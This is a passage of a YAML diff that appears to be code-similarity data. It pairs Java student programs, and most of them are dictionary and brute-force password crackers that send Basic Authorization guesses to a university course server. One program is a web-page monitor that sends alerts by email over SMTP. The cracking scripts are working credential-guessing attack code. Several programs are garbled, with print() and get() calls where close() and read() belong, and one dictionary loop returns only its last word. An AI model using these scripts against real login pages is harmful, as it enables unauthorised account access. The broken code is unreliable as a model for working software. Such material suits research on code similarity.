+    \  + Character.toUpperCase(password[2]);\n            \n        }\n        else if (candidate.length() > 3)\n        {\n\
+    \            casedPasswords = new String[8];\n            String tailCharacters = new String(password, 3, (password.length\
+    \ - 3));\n            casedPasswords[0] = Character.toString(Character.toLowerCase(password[0])) + Character.toString(Character.toLowerCase(password[1]))\
+    \  + Character.toString(Character.toLowerCase(password[2])) + tailCharacters;\n            casedPasswords[1] = Character.toString(Character.toUpperCase(password[0]))\
+    \ + Character.toString(Character.toUpperCase(password[1]))  + Character.toString(Character.toUpperCase(password[2])) +\
+    \ tailCharacters;\n            casedPasswords[2] = Character.toString(Character.toLowerCase(password[0])) + Character.toString(Character.toLowerCase(password[1]))\
+    \  + Character.toString(Character.toUpperCase(password[2])) + tailCharacters;\n            casedPasswords[3] = Character.toString(Character.toLowerCase(password[0]))\
+    \ + Character.toString(Character.toUpperCase(password[1]))  + Character.toString(Character.toLowerCase(password[2])) +\
+    \ tailCharacters;\n            casedPasswords[4] = Character.toString(Character.toUpperCase(password[0])) + Character.toString(Character.toLowerCase(password[1]))\
+    \  + Character.toString(Character.toLowerCase(password[2])) + tailCharacters;\n            casedPasswords[5] = Character.toString(Character.toUpperCase(password[0]))\
+    \ + Character.toString(Character.toUpperCase(password[1]))  + Character.toString(Character.toLowerCase(password[2])) +\
+    \ tailCharacters;\n            casedPasswords[6] = Character.toString(Character.toUpperCase(password[0])) + Character.toString(Character.toLowerCase(password[1]))\
+    \  + Character.toString(Character.toUpperCase(password[2])) + tailCharacters;\n            casedPasswords[7] = Character.toString(Character.toLowerCase(password[0]))\
+    \ + Character.toString(Character.toUpperCase(password[1]))  + Character.toString(Character.toUpperCase(password[2])) +\
+    \ tailCharacters;\n            \n        }\n        \n\t    if(verbose == CrackingConstants.verboseMode2)\n\t        printPasswords(casedPasswords);\n\
+    \n        return casedPasswords;\n    }\n    \n   \n\t\n    private void printPasswords(String [] passwords)\n    {\n\
+    \        if(passwords.length > 0)\n        {\n           for( i = 0; i < passwords.length; i++)\t\n           {\n    \
+    \            System.out.print(passwords[i] + \"\\t\");\n           }\n           System.out.println(\"\\n\");\n      \
+    \  }\n    }  \n    \n} \n"
+  - "import java.net.*;\nimport java.io.*;\n\n public class Dictionary {\n int attempts = 0;\n   URLConnection conn = null;\n\
+    \n   public static void main (String args[]){\n\n\tDictionary a = new Dictionary();\n     a.attack(args);\n     }\n\n\
+    \   public void attack(String args[]) {\n   try {\n       String login = new String(\"\");\n       String url = new String(\"\
+    http://sec-crack.cs.rmit.edu./SEC/2/index.php\");\n       String passwd = new String();\n\n\n       passwd = getPasswd();\n\
+    \       BufferedReader in = new BufferedReader( new InputStreamReader (openURLForInput(new URL(url), login , passwd)));\n\
+    \n       String line;\n       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n       \
+    \    }\n           System.out.println(\"Password Cracked Successfully!!!\");\n           System.out.println(\"The passsword\
+    \ is :\" + passwd + \"and got after \" +attempts + \" tries\");\n       }\n     catch (IOException e) {\n  \n      String\
+    \ r = new String(e.getMessage());\n    if ( r != null)\n    {\n     System.out.println(\"Message :\" +r);\n     Dictionary\
+    \ a = new Dictionary();\n     a.attack(args);\n    }\n     else\n     {\n\tSystem.out.println(\"Trying again\");\n\tDictionary\
+    \ a = new Dictionary();\n\ta.attack(args);\n     }\n     }\n   }\n  public String getPasswd()\n  {\n\n int i=0;int j=0;\n\
+    \ attempts++;\n int count =0;\n System.out.println(\"Passing dictionary word and waiting for URL reply....... \");\n \
+    \ String currentword = \"\";\n  String se = \"\";\n  try{\n FileInputStream reader = new FileInputStream (\"words\");\n\
+    \ DataInputStream in = new DataInputStream(reader);\n while (in.available() !=0)\n{\n currentword = in.readLine();\n count++;\n\
+    \ \n \n }\n }\n  catch( IOException e){}\n\n  return currentword;\n\t \n         }\n\n\n\n public InputStream openURLForInput\
+    \ (URL url, String uname, String pword)\n throws IOException  {\n     conn = url.openConnection();\n     conn.setDoInput\
+    \ (true);\n     conn.setRequestProperty (\"Authorization\", userNamePasswordBase64(uname,pword));\n     conn.connect ();\n\
+    \     return conn.getInputStream();\n     }\n\n\n public String userNamePasswordBase64(String username, String password)\
+    \ {\n     return \" \" + base64Encode (username + \":\" + password);\n     }\n\n private final static char base64Array\
+    \ [] = {\n       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q',\
+    \ 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k',\
+    \ 'l', 'm', 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n   \
+    \    '4', '5', '6', '7', '8', '9', '+', '/'\n  };\n\n private static String base64Encode (String string)    {\n     String\
+    \ encodedString = \"\";\n     byte bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n     while (i <\
+    \ bytes.length) {\n       byte b1 = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length) {\n\
+    \          b2 = 0;\n          b3 = 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n \
+    \         if (i >= bytes.length) {\n             b3 = 0;\n             pad = 1;\n             }\n          else\n    \
+    \         b3 = bytes [i++];\n          }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4)\
+    \ | (b2 >> 4));\n       byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n      \
+    \ encodedString += base64Array [c1];\n       encodedString += base64Array [c2];\n       switch (pad) {\n         case\
+    \ 0:\n          encodedString += base64Array [c3];\n          encodedString += base64Array [c4];\n          break;\n \
+    \        case 1:\n          encodedString += base64Array [c3];\n          encodedString += \"=\";\n          break;\n\
+    \         case 2:\n          encodedString += \"==\";\n          break;\n        }\n       }\n       return encodedString;\n\
+    \   }\n }\n\n"
+- source_sentence: "import java.net.*;\nimport java.io.*;\nimport java.*;\n\n public class Dictionary {\n\n   URLConnection\
+    \ conn = null;\n   private static boolean status = false;\n\n   public static void main (String args[]){\n     Dictionary\
+    \ a = new Dictionary();\n     String[] inp = {\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\",\n     \t\t\t\t \"\",\n\
+    \     \t\t\t\t \"\"};\n     File file = new File(\"words\");\n     exit:\n     try {\n\t\t BufferedReader in = new BufferedReader(new\
+    \ FileReader(file));\n\t\t int attempt = 0;\n\t\t inp[2] = in.readLine();\n\t\t while (inp[2] != null) {\n\t\n\t\t\t if\
+    \ (inp[2].length() <= 3) {\n\t\t\t \tattempt++;\n\t\t\t \ta.doit(inp);\n     \t\t \tif (status) {\n\t\t\t \t\t System.out.println(\"\
+    Crrect password is: \" + inp[2]);\n\t\t\t \t\t System.out.println(\"Number of attempts = \" + attempt);\n\t\t\t \t\t break\
+    \ exit;\n\t\t\t \t}\n\t\t \t }\n\t\t\t inp[2] = in.readLine();\n   \t\t}\n\t } catch (FileNotFoundException e1) {\n\t\t\
+    \ \n\t\tSystem.err.println(\"File not found: \" + file);\n\t} catch (IOException e2) {\n\t\t\n\t\te2.printStackTrace();\n\
+    \t}\n\n   }\n\n   public void doit(String args[]) {\n     \n     try {\n       BufferedReader in = new BufferedReader(\n\
+    \           new InputStreamReader\n              (connectURL(new URL(args[0]), args[1], args[2])));\n       String line;\n\
+    \       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n           status = true;\n  \
+    \         }\n       }\n     catch (IOException e) {\n   \n       }\n     }\n\n   public InputStream connectURL (URL url,\
+    \ String uname, String pword)\n        throws IOException  {\n     conn = url.openConnection();\n     conn.setRequestProperty\
+    \ (\"Authorization\",\n     userNamePasswordBase64(uname,pword));\n     conn.connect ();\n     return conn.getInputStream();\n\
+    \     }\n\n   public String userNamePasswordBase64(String username, String password) {\n     return \" \" + base64Encode\
+    \ (username + \":\" + password);\n     }\n\n   private final static char base64Array [] = {\n       'A', 'B', 'C', 'D',\
+    \ 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n\
+    \       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n       'o', 'p', 'q',\
+    \ 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n       '4', '5', '6', '7', '8', '9', '+',\
+    \ '/'\n  };\n\n   private static String base64Encode (String string)    {\n     String encodedString = \"\";\n     byte\
+    \ bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n     while (i < bytes.length) {\n       byte b1\
+    \ = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length) {\n          b2 = 0;\n          b3 =\
+    \ 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n          if (i >= bytes.length) {\n\
+    \             b3 = 0;\n             pad = 1;\n             }\n          else\n             b3 = bytes [i++];\n       \
+    \   }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n       byte c3 = (byte)(((b2\
+    \ & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array [c1];\n       encodedString\
+    \ += base64Array [c2];\n       switch (pad) {\n        case 0:\n          encodedString += base64Array [c3];\n       \
+    \   encodedString += base64Array [c4];\n          break;\n        case 1:\n          encodedString += base64Array [c3];\n\
+    \          encodedString += \"=\";\n          break;\n        case 2:\n          encodedString += \"==\";\n          break;\n\
+    \        }\n       }\n       return encodedString;\n   }\n }\n\n"
+  sentences:
+  - "\n\nimport java.net.*;\nimport java.io.*;\nimport java.util.*;\n\npublic class WatchDog extends TimerTask{\n\n  private\
+    \ static URL location;\n  private static String email;\n  private static int checktime;\n  private static Timer timer\
+    \ = new Timer();\n  private BufferedReader input;\n  private File checksumFile = new File(\"chksum.txt\");\n  private\
+    \ File temp0000File = new File(\"temp0000\");\n  private File kept0000File = new File(\"kept0000\");\n\n  \n\n    public\
+    \ WatchDog(){\n      timer.schedule(this, new Date(), checktime);\n    }\n\n\n    \n\n      public void run(){\n     \
+    \   Vector imageFiles = new Vector();\n        Vector diffImages = new Vector();\n        try {\n          System.out.println(\"\
+    \ Time: \".concat(new Date().toString()));\n          System.out.println(\"Retreiving File\");\n          \n         \
+    \ input = new BufferedReader(new InputStreamReader\n                                     (location.openStream()));\n \
+    \         \n          BufferedWriter outputFile = new BufferedWriter\n              (new FileWriter(temp0000File));\n\
+    \          String line = input.readLine();\n          while (line != null) {\n            StringBuffer imageFileName =\
+    \ new StringBuffer();\n            if (scanForImages(line, imageFileName)) {\n              String imageFile = new String(imageFileName);\n\
+    \              System.out.println(\"Detected image: \".concat(imageFile));\n              try {\n                imageFiles.add(new\
+    \ URL(imageFile));\n              }\n              catch (MalformedURLException e) {\n                System.out.println(\"\
+    Image file detected. URL is malformed\");\n              }\n            }\n            outputFile.write(line);\n     \
+    \       outputFile.write(\"\\n\");\n            line = input.readLine();\n          }\n          input.print();\n    \
+    \      outputFile.flush();\n          outputFile.print();\n          System.out.println(\" File Retreived\");\n      \
+    \    if (!imageFiles.isEmpty()) {\n            checkImages(imageFiles, diffImages);\n          }\n          if (!checksumFile.exists())\
+    \ {\n            generateChecksum(temp0000File.getName(), checksumFile);\n          }\n          else {\n            if\
+    \ (!checksumOk(checksumFile)) {\n              reportDifferences(true, temp0000File, kept0000File, diffImages);\n    \
+    \          generateChecksum(temp0000File.getName(), checksumFile);\n            }\n            else if (!diffImages.isEmpty()){\n\
+    \              reportDifferences(false, null, null, diffImages);\n            }\n          }\n\n          \n         \
+    \ temp0000File.renameTo(kept0000File);\n          System.out.println(\"End Time: \".concat(new Date().toString()));\n\
+    \        }\n        catch (MalformedURLException e) {\n          e.printStackTrace();\n        }\n        catch (ConnectException\
+    \ e) {\n          System.out.println(\"Failed  connect\");\n          System.exit(-1);\n        }\n        catch (IOException\
+    \ e) {\n          e.printStackTrace();\n          System.exit(-1);\n        }\n      }\n\n      \n\n      public boolean\
+    \ scanForImages(String line, StringBuffer imageFileName) {\n        \n        \n        String lineIgnoreCase = line.toLowerCase();\n\
+    \        int imgPos = lineIgnoreCase.indexOf(\"<img \");\n        if ( imgPos != -1 ){\n          int srcPos = lineIgnoreCase.indexOf(\"\
+    src\", imgPos);\n          int bracketPos = lineIgnoreCase.indexOf(\">\", imgPos);\n          if (srcPos != -1 && bracketPos\
+    \ != -1 && srcPos < bracketPos) {\n            int quote1Pos = lineIgnoreCase.indexOf(\"\\\"\", srcPos);\n           \
+    \ int quote2Pos = lineIgnoreCase.indexOf(\"\\\"\", quote1Pos+1);\n            if (quote1Pos != -1 && quote2Pos != -1 &&\n\
+    \                quote1Pos < quote2Pos && quote2Pos < bracketPos) {\n              \n              imageFileName.append(line.substring(quote1Pos\
+    \ + 1,\n                  quote2Pos));\n              if (imageFileName.indexOf(\"//\") == -1 ) {\n                \n\
+    \                String URLName = location.toString();\n                int slashPos = URLName.lastIndexOf(\"/\");\n \
+    \               URLName = URLName.substring(0, slashPos);\n                String HostName = \"http://\".concat(location.getHost());\n\
+    \                if (imageFileName.indexOf(\"//\") == 0) {\n                  \n                }\n                else\
+    \ if (imageFileName.charAt(0) != '/') {\n                  \n                  imageFileName.insert(0, URLName.concat(\"\
+    /\"));\n                }\n                else {\n                  \n                  imageFileName.insert(0, HostName);\n\
+    \                }\n              }\n              return true;\n            }\n          }\n        }\n        return\
+    \ false;\n      }\n\n      \n\n      public void checkImages(Vector imageFiles, Vector diffImages)\n          throws IOException{\n\
+    \        System.out.println(\"Retrieving image \");\n        Enumeration imageFilesEnumeration = imageFiles.elements();\n\
+    \        while (imageFilesEnumeration.hasMoreElements()) {\n          URL url = (URL)imageFilesEnumeration.nextElement();\n\
+    \          try {\n            BufferedInputStream imageInput = new BufferedInputStream\n                (url.openStream());\n\
+    \            String localFile = url.getFile();\n            \n            \n            \n            \n            \n\
+    \            int slashPosition = localFile.lastIndexOf(\"/\");\n            if (slashPosition != -1) {\n             \
+    \ localFile = localFile.substring(slashPosition+1);\n            }\n            System.out.println(\"Retrieving image\
+    \ file: \".concat(localFile));\n            BufferedOutputStream imageOutput = new BufferedOutputStream\n            \
+    \    (new FileOutputStream(localFile));\n            byte bytes[] = new byte[10000];\n            int noBytes = imageInput.get(bytes);\n\
+    \            while (noBytes != -1) {\n              imageOutput.write(bytes, 0, noBytes );\n              noBytes = imageInput.print(bytes);\n\
+    \            }\n            File imageChecksumFile = new File(localFile.concat(\".chksum.txt\"));\n            if (!imageChecksumFile.exists())\
+    \ {\n              generateChecksum(localFile, imageChecksumFile);\n            }\n            else {\n              if\
+    \ (!checksumOk(imageChecksumFile)) {\n                diffImages.add(localFile);\n                generateChecksum(localFile,\
+    \ imageChecksumFile);\n              }\n            }\n          }\n          catch (FileNotFoundException e) {\n    \
+    \        System.out.println(\"Unable  locate URL: \".concat(url.toString()));\n          }\n        }\n      }\n\n   \
+    \   \n\n      public void generateChecksum(String inputFile, File checksum){\n        try {\n          System.out.println(\"\
+    Generating new checksum for \".concat(inputFile));\n          \n          Process process = Runtime.getRuntime().exec(\"\
+    md5sum \".\n                                                      concat(inputFile));\n          BufferedReader execCommand\
+    \ = new BufferedReader(new\n              InputStreamReader((process.getInputStream())));\n          BufferedWriter outputFile\
+    \ = new\n              BufferedWriter(new FileWriter(checksum));\n          String line = execCommand.readLine();\n  \
+    \        while (line != null) {\n            outputFile.write(line);\n            outputFile.write(\"\\n\");\n       \
+    \     line = execCommand.readLine();\n          }\n          outputFile.flush();\n          outputFile.print();\n    \
+    \      System.out.println(\"Checksum produced\");\n        }\n        catch (IOException e) {\n          e.printStackTrace();\n\
+    \          System.exit(-1);\n        }\n      }\n\n      \n\n      public boolean checksumOk(File chksumFile){\n     \
+    \   try {\n          System.out.println(\"Comparing checksums using \".concat(chksumFile\n              ,e.getName()));\n\
+    \          \n          Process process = Runtime.getRuntime().\n              exec(\"md5sum --check \".concat(chksumFile.getName()));\n\
+    \          BufferedReader execCommand = new BufferedReader(new\n              InputStreamReader( (process.getInputStream())));\n\
+    \          String line = execCommand.readLine();\n          if (line.indexOf(\": OK\") != -1) {\n            System.out.println(\"\
+    \  the same\");\n            return true;\n          }\n        }\n        catch (IOException e) {\n          e.printStackTrace();\n\
+    \          System.exit(-1);\n        }\n        System.out.println(\"Differences Found\");\n        return false;\n  \
+    \    }\n\n      \n\n      public void reportDifferences(boolean diffsFound, File file1, File file2,\n                \
+    \                    Vector images){\n        try {\n          System.out.println(\"Generating difference report\");\n\
+    \          \n          Socket emailConnection = new Socket(\"yallara.cs.rmit.edu.\", 25);\n          BufferedWriter emailOutStream\
+    \ = new BufferedWriter\n              (new OutputStreamWriter(emailConnection.getOutputStream()));\n          BufferedReader\
+    \ emailInStream = new BufferedReader\n              (new InputStreamReader(emailConnection.getInputStream()));\n     \
+    \     String line = emailInStream.readLine();\n          System.out.println(line);\n          if (!line.startsWith(\"\
+    220\")) {\n              System.out.println\n                  (\" error occured connecting  email server. Cannot send\
+    \ email.\");\n          }\n          else {\n            \n            \n            emailOutStream.write(\"HELO yallara.cs.rmit.edu.\"\
+    );\n            emailOutStream.newLine();\n            emailOutStream.flush();\n            line = emailInStream.readLine();\n\
+    \            System.out.println(line);\n            if (!line.startsWith(\"250\")) {\n                System.out.println\n\
+    \                    (\" error occured connecting  email server. Cannot send email.\");\n            }\n            else\
+    \ {\n              emailOutStream.write(\"MAIL FROM: watchdog@cs.rmit.edu.\");\n              emailOutStream.newLine();\n\
+    \              emailOutStream.flush();\n              line = emailInStream.readLine();\n              System.out.println(line);\n\
+    \              if (!line.startsWith(\"250\")) {\n                System.out.println\n                    (\" error occured\
+    \ sending email. Cannot send email.\");\n              }\n              else {\n                emailOutStream.write(\"\
+    RCPT : \".concat(email));\n                emailOutStream.newLine();\n                emailOutStream.flush();\n      \
+    \          line = emailInStream.readLine();\n                System.out.println(line);\n                if (!line.startsWith(\"\
+    250\")) {\n                 System.out.println\n                     (\" error occured sending email. Cannot send email.\"\
+    );\n                }\n                else {\n                  emailOutStream.write(\"DATA\");\n                  emailOutStream.newLine();\n\
+    \                  emailOutStream.flush();\n                  line = emailInStream.readLine();\n                  System.out.println(line);\n\
+    \                  if (!line.startsWith(\"354\")) {\n                   System.out.println\n                       (\"\
+    \ error occured sending email. Cannot send email.\");\n                  }\n                  emailOutStream.newLine();\n\
+    \n                  if (!images.isEmpty()) {\n                      emailOutStream.write\n                          (\"\
+    Differences were found in the following image \");\n                      emailOutStream.newLine();\n                \
+    \      Enumeration e = images.elements();\n                      while (e.hasMoreElements()) {\n                     \
+    \   String s = (String) e.nextElement();\n                        emailOutStream.write(s);\n                        emailOutStream.newLine();\n\
+    \                      }\n                      emailOutStream.newLine();\n                  }\n\n                  if\
+    \ (diffsFound) {\n                    \n                    String command = \"diff \".concat(file1.getName().concat(\"\
+    \ \")\n                                                    .concat(file2.getName()));\n                    Process process\
+    \ = Runtime.getRuntime().exec(command);\n                    BufferedReader execCommand = new BufferedReader\n       \
+    \                 (new InputStreamReader( (process.getInputStream())));\n                    line = execCommand.readLine();\n\
+    \                    emailOutStream.write(\"Diffences found in  file\");\n                    emailOutStream.newLine();\n\
+    \                    while (line != null) {\n                      System.out.println(line);\n                      emailOutStream.write(line);\n\
+    \                      emailOutStream.newLine();\n                      line = execCommand.readLine();\n             \
+    \       }\n                  }\n\n                  \n                  emailOutStream.newLine();\n                  emailOutStream.write(\"\
+    .\");\n                  emailOutStream.newLine();\n                  emailOutStream.flush();\n                  line\
+    \ = emailInStream.readLine();\n                  System.out.println(line);\n                  if (!line.startsWith(\"\
+    250\")) {\n                    System.out.println\n                        (\" error occured sending email. Cannot send\
+    \ email.\");\n                  }\n                  else {\n                    emailOutStream.write(\"QUIT\");\n   \
+    \                 emailOutStream.newLine();\n                    emailOutStream.flush();\n                    System.out.println(emailInStream.readLine());\n\
+    \                  }\n                }\n              }\n            }\n          }\n        }\n        catch (IOException\
+    \ e) {\n          e.printStackTrace();\n          System.exit(-1);\n        }\n      }\n\n\n    \n\n    public static\
+    \ void main(String args[]) {\n      if (args.length != 3) {\n        System.out.println(\"Usage: java WatchDog url email\
+    \ checktime(hours)\");\n        System.exit(-1);\n      }\n      try {\n        location = new URL(args[0]);\n      }\n\
+    \      catch (MalformedURLException e) {\n        e.printStackTrace();\n      }\n      email = new String().concat(args[1]);\n\
+    \      checktime = Integer.parseInt(args[2]) * 60 * 60 * 1000;\n      new WatchDog();\n    }\n}\n"
+  - "import java.net.*;\nimport java.io.*;\nimport java.*;\n\n public class BruteForce {\n\n   URLConnection conn = null;\n\
+    \   private static boolean status = false;\n\n   public static void main (String args[]){\n     BruteForce a = new BruteForce();\n\
+    \     String[] inp = {\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\",\n     \t\t\t\t \"\",\n     \t\t\t\t \"\"};\n\
+    \     int attempts = 0;\n     exit:\n     for (int i=0;i<pwdArray.length;i++) {\n\t\t for (int j=0;j<pwdArray.length;j++)\
+    \ {\n\t\t\t for (int k=0;k<pwdArray.length;k++) {\n\t\t\t\t if (pwdArray[i] == ' ' && pwdArray[j] != ' ') continue;\n\t\
+    \t\t\t if (pwdArray[j] == ' ' && pwdArray[k] != ' ') continue;\n\t\t\t\t inp[2] = inp[2] + pwdArray[i] + pwdArray[j] +\
+    \ pwdArray[k];\n\t\t\t\t attempts++;\n     \t\t\t a.doit(inp);\n  \n  \t\t\t\t if (status) {\n\t\t\t\t\t System.out.println(\"\
+    Crrect password is: \" + inp[2]);\n\t\t\t\t\t System.out.println(\"Number of attempts = \" + attempts);\n\t\t\t\t\t break\
+    \ exit;\n\t\t\t \t }\n     \t\t\t inp[2] = \"\";\n\t\t \t }\n\t \t }\n      }\n     }\n\n   public void doit(String args[])\
+    \ {\n     \n     try {\n       BufferedReader in = new BufferedReader(\n           new InputStreamReader\n           \
+    \   (connectURL(new URL(args[0]), args[1], args[2])));\n       String line;\n       while ((line = in.readLine()) != null)\
+    \ {\n           System.out.println(line);\n           status = true;\n           }\n       }\n     catch (IOException\
+    \ e) {\n   \n       }\n     }\n\n   public InputStream connectURL (URL url, String uname, String pword)\n        throws\
+    \ IOException  {\n     conn = url.openConnection();\n     conn.setRequestProperty (\"Authorization\",\n     userNamePasswordBase64(uname,pword));\n\
+    \     conn.connect ();\n     return conn.getInputStream();\n     }\n\n   public String userNamePasswordBase64(String username,\
+    \ String password) {\n     return \" \" + base64Encode (username + \":\" + password);\n     }\n\n   private final static\
+    \ char pwdArray [] = {\n\t        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h',\n\t        'i', 'j', 'k', 'l', 'm', 'n', 'o',\
+    \ 'p',\n\t        'q', 'r', 's', 't', 'u', 'v', 'w', 'x',\n\t        'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',\n\t     \
+    \   'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N',\n\t        'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',\n\t        'W', 'X', 'Y',\
+    \ 'Z', ' '\n  };\n\n   private final static char base64Array [] = {\n       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n\
+    \       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a',\
+    \ 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u',\
+    \ 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n       '4', '5', '6', '7', '8', '9', '+', '/'\n  };\n\n   private\
+    \ static String base64Encode (String string)    {\n     String encodedString = \"\";\n     byte bytes [] = string.getBytes\
+    \ ();\n     int i = 0;\n     int pad = 0;\n     while (i < bytes.length) {\n       byte b1 = bytes [i++];\n       byte\
+    \ b2;\n       byte b3;\n       if (i >= bytes.length) {\n          b2 = 0;\n          b3 = 0;\n          pad = 2;\n  \
+    \        }\n       else {\n          b2 = bytes [i++];\n          if (i >= bytes.length) {\n             b3 = 0;\n   \
+    \          pad = 1;\n             }\n          else\n             b3 = bytes [i++];\n          }\n       byte c1 = (byte)(b1\
+    \ >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n       byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >>\
+    \ 6));\n       byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array [c1];\n       encodedString += base64Array\
+    \ [c2];\n       switch (pad) {\n        case 0:\n          encodedString += base64Array [c3];\n          encodedString\
+    \ += base64Array [c4];\n          break;\n         case 1:\n          encodedString += base64Array [c3];\n          encodedString\
+    \ += \"=\";\n          break;\n        case 2:\n          encodedString += \"==\";\n          break;\n        }\n    \
+    \   }\n       return encodedString;\n   }\n }\n\n"
+  - "import java.net.*;\nimport java.io.*;\n\n public class Dictionary {\n int attempts = 0;\n   URLConnection conn = null;\n\
+    \n   public static void main (String args[]){\n\n\tDictionary a = new Dictionary();\n     a.attack(args);\n     }\n\n\
+    \   public void attack(String args[]) {\n   try {\n       String login = new String(\"\");\n       String url = new String(\"\
+    http://sec-crack.cs.rmit.edu./SEC/2/index.php\");\n       String passwd = new String();\n\n\n       passwd = getPasswd();\n\
+    \       BufferedReader in = new BufferedReader( new InputStreamReader (openURLForInput(new URL(url), login , passwd)));\n\
+    \n       String line;\n       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n       \
+    \    }\n           System.out.println(\"Password Cracked Successfully!!!\");\n           System.out.println(\"The passsword\
+    \ is :\" + passwd + \"and got after \" +attempts + \" tries\");\n       }\n     catch (IOException e) {\n  \n      String\
+    \ r = new String(e.getMessage());\n    if ( r != null)\n    {\n     System.out.println(\"Message :\" +r);\n     Dictionary\
+    \ a = new Dictionary();\n     a.attack(args);\n    }\n     else\n     {\n\tSystem.out.println(\"Trying again\");\n\tDictionary\
+    \ a = new Dictionary();\n\ta.attack(args);\n     }\n     }\n   }\n  public String getPasswd()\n  {\n\n int i=0;int j=0;\n\
+    \ attempts++;\n int count =0;\n System.out.println(\"Passing dictionary word and waiting for URL reply....... \");\n \
+    \ String currentword = \"\";\n  String se = \"\";\n  try{\n FileInputStream reader = new FileInputStream (\"words\");\n\
+    \ DataInputStream in = new DataInputStream(reader);\n while (in.available() !=0)\n{\n currentword = in.readLine();\n count++;\n\
+    \ \n \n }\n }\n  catch( IOException e){}\n\n  return currentword;\n\t \n         }\n\n\n\n public InputStream openURLForInput\
+    \ (URL url, String uname, String pword)\n throws IOException  {\n     conn = url.openConnection();\n     conn.setDoInput\
+    \ (true);\n     conn.setRequestProperty (\"Authorization\", userNamePasswordBase64(uname,pword));\n     conn.connect ();\n\
+    \     return conn.getInputStream();\n     }\n\n\n public String userNamePasswordBase64(String username, String password)\
+    \ {\n     return \" \" + base64Encode (username + \":\" + password);\n     }\n\n private final static char base64Array\
+    \ [] = {\n       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q',\
+    \ 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k',\
+    \ 'l', 'm', 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n   \
+    \    '4', '5', '6', '7', '8', '9', '+', '/'\n  };\n\n private static String base64Encode (String string)    {\n     String\
+    \ encodedString = \"\";\n     byte bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n     while (i <\
+    \ bytes.length) {\n       byte b1 = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length) {\n\
+    \          b2 = 0;\n          b3 = 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n \
+    \         if (i >= bytes.length) {\n             b3 = 0;\n             pad = 1;\n             }\n          else\n    \
+    \         b3 = bytes [i++];\n          }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4)\
+    \ | (b2 >> 4));\n       byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n      \
+    \ encodedString += base64Array [c1];\n       encodedString += base64Array [c2];\n       switch (pad) {\n         case\
+    \ 0:\n          encodedString += base64Array [c3];\n          encodedString += base64Array [c4];\n          break;\n \
+    \        case 1:\n          encodedString += base64Array [c3];\n          encodedString += \"=\";\n          break;\n\
+    \         case 2:\n          encodedString += \"==\";\n          break;\n        }\n       }\n       return encodedString;\n\
+    \   }\n }\n\n"
+- source_sentence: "import java.net.*;\nimport java.io.*;\nimport java.*;\n\n public class Dictionary {\n\n   URLConnection\
+    \ conn = null;\n   private static boolean status = false;\n\n   public static void main (String args[]){\n     Dictionary\
+    \ a = new Dictionary();\n     String[] inp = {\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\",\n     \t\t\t\t \"\",\n\
+    \     \t\t\t\t \"\"};\n     File file = new File(\"words\");\n     exit:\n     try {\n\t\t BufferedReader in = new BufferedReader(new\
+    \ FileReader(file));\n\t\t int attempt = 0;\n\t\t inp[2] = in.readLine();\n\t\t while (inp[2] != null) {\n\t\n\t\t\t if\
